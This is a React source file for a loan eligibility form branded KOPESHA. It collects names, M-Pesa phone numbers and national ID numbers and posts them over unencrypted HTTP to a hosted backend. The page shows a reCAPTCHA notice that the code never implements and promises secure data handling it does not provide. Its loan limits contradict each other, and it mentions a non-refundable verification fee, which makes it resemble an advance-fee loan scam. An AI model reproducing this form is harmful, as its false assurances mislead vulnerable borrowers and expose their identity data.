import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './LoanForm.css'; // Import your CSS file

const LoanForm = () => {
  const [formData, setFormData] = useState({
    name: '',
    phone: '',
    idNumber: '',
    loanType: ''
  });

  const [errors, setErrors] = useState({});
  const navigate = useNavigate();

  const [showModal, setShowModal] = useState(false); // 'terms' or 'privacy'

  const openModal = (type) => setShowModal(type);
  const closeModal = () => setShowModal(false);

  // Handle input changes
  const handleChange = (e) => {
    const { name, value } = e.target;

    setFormData(prev => ({
      ...prev,
      [name]: value
    }));

    validateField(name, value);
  };

  // Validate individual field
  const validateField = (fieldName, value) => {
    let error = '';

    switch (fieldName) {
      case 'name':
        if (!value.trim()) error = 'Name is required';
        else if (!/^[A-Za-z ]+$/.test(value)) error = 'Name can only contain letters and spaces';
        break;
      case 'phone':
        if (!value.trim()) error = 'Phone number is required';
        else if (!/^\d{10}$/.test(value)) error = 'Phone number must be exactly 10 digits';
        break;
      case 'idNumber':
        if (!value.trim()) error = 'ID number is required';
        else if (!/^\d{8}$/.test(value)) error = 'ID number must be exactly 8 digits';
        break;
      case 'loanType':
        if (!value) error = 'Please select a loan type';
        break;
      default:
        break;
    }

    setErrors(prev => ({
      ...prev,
      [fieldName]: error
    }));
  };

  // Validate all fields before submission
  const validate = () => {
    const newErrors = {};

    if (!formData.name.trim()) newErrors.name = 'Name is required';
    else if (!/^[A-Za-z ]+$/.test(formData.name)) newErrors.name = 'Name can only contain letters and spaces';

    if (!formData.phone.trim()) newErrors.phone = 'Phone number is required';
    else if (!/^\d{10}$/.test(formData.phone)) newErrors.phone = 'Phone number must be exactly 10 digits';

    if (!formData.idNumber.trim()) newErrors.idNumber = 'ID number is required';
    else if (!/^\d{8}$/.test(formData.idNumber)) newErrors.idNumber = 'ID number must be exactly 8 digits';

    if (!formData.loanType) newErrors.loanType = 'Please select a loan type';

    setErrors(newErrors);

    return Object.keys(newErrors).length === 0;
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validate()) return;

    console.log('Submitting form data:', formData);

    try {
      const response = await fetch('http://kopesha-backend-3.onrender.com/api/loans/apply', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
      });

      const data = await response.json();
      navigate('/approval', { state: data });
    } catch (err) {
      console.error('Error submitting loan:', err);
    }
  };

  return (
    <>
      <form className="form-container" onSubmit={handleSubmit}>
        <h2 className="form-title">Find Your Loan Eligibility</h2>

        <div className="eligibility-info">
          <p>You can qualify for Ksh. 5,000 - 50,000 loan to MPESA</p>
        </div>

        {/* Name */}
        <div className="form-group">
          <input
            type="text"
            name="name"
            placeholder="Your Name"
            value={formData.name}
            onChange={handleChange}
            className={`form-input ${errors.name ? 'error' : ''}`}
          />
          {errors.name && <span className="error-text">{errors.name}</span>}
        </div>

        {/* Phone */}
        <div className="form-group">
          <input
            type="tel"
            name="phone"
            placeholder="Mpesa Phone Number"
            value={formData.phone}
            onChange={handleChange}
            className={`form-input ${errors.phone ? 'error' : ''}`}
          />
          {errors.phone && <span className="error-text">{errors.phone}</span>}
        </div>

        {/* ID Number */}
        <div className="form-group">
          <input
            type="text"
            name="idNumber"
            placeholder="National ID Number"
            value={formData.idNumber}
            onChange={handleChange}
            className={`form-input ${errors.idNumber ? 'error' : ''}`}
          />
          {errors.idNumber && <span className="error-text">{errors.idNumber}</span>}
        </div>

        {/* Loan Type */}
        <div className="form-group">
          <select
            name="loanType"
            value={formData.loanType}
            onChange={handleChange}
            className={`form-select ${errors.loanType ? 'error' : ''}`}
          >
            <option value="">Select Loan Type</option>
            <option value="emergency">Emergency Loan</option>
            <option value="topup">Top Up Loan</option>
            <option value="rental">Rental Loan</option>
            <option value="car">Car Loan</option>
          </select>
          {errors.loanType && <span className="error-text">{errors.loanType}</span>}
        </div>

        <p className="benefits-text">
          No CRB Check. No Guarantors. Disbursed to MPESA. No Paperwork
        </p>

        <button type="submit" className="submit-btn">
          FIND YOUR LOAN ELIGIBILITY
        </button>

        {/* Terms section */}
        <div className="terms-section">
          <p className="terms-text">
            By submitting you confirm that you accept the{" "}
            <span className="terms-link" onClick={() => openModal('terms')}>
              Terms and Conditions
            </span>{" "}
            and{" "}
            <span className="terms-link" onClick={() => openModal('privacy')}>
              Privacy Policy
            </span>
          </p>
        </div>

        {/* Google Privacy & Terms */}
        <div className="privacy-section">
          <p className="privacy-text">
            Protected by reCAPTCHA and subject to the Google{" "}
            <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer">
              Privacy Policy
            </a>{" "}
            and{" "}
            <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer">
              Terms of Service
            </a>
          </p>
        </div>
      </form>

      {/* Modal */}
      {showModal && (
        <div className="modal-overlay" onClick={closeModal}>
          <div className="modal-content left-modal" onClick={e => e.stopPropagation()}>
            <button className="close-btn" onClick={closeModal}>&times;</button>

            {showModal === 'terms' && (
              <>
                <h2>Terms and Conditions</h2>
                <div className="modal-body">
                  <p>Welcome to KOPESHA Loan. By using our services, you agree to the following terms:</p>
                  <p>
                    1. Loan amounts are subject to approval. <br />
                    2. Verification fees apply. <br />
                    3. Payments must be made promptly. <br />
                    4. Any misuse of the service may result in penalties.<br /><br />

                    Loan facilities borrowed under this product will be hinged on pre-existing product features.<br />
                    In case of default of the USSD loans, normal collection processes shall apply.<br />
                    Maximum loan amount: Ksh 15,000 (non-refundable verification fee applies).<br />
                    Maximum loan duration: 1 Month (30 Days).<br />
                    Loan disbursement: Funds will be sent to the MPESA number provided (5-7 working days).
                  </p>
                </div>
              </>
            )}

            {showModal === 'privacy' && (
              <>
                <h2>Privacy Policy</h2>
                <div className="modal-body">
                  <p>
                    We respect your privacy. Any personal information you provide is handled in accordance with our privacy policy:
                  </p>
                  <p>
                    1. Your personal data will be securely stored.<br />
                    2. Data will only be used for processing your loan application.<br />
                    3. We will not share your information with third parties without consent.<br />
                    4. You have the right to request deletion of your data.
                  </p>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
};

export default LoanForm;


